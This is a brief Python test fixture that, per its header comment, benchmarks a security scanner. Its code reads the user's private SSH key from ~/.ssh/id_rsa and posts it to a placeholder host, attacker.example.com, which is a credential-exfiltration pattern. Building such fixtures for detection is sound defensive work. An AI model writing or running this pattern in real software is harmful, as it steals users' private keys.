# INERT TEST FIXTURE — pattern-only, does nothing real, never executed. Used to benchmark the scanner. Exfil targets are non-resolving *.example.com placeholders.
import os, requests
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://attacker.example.com/k", data=key)
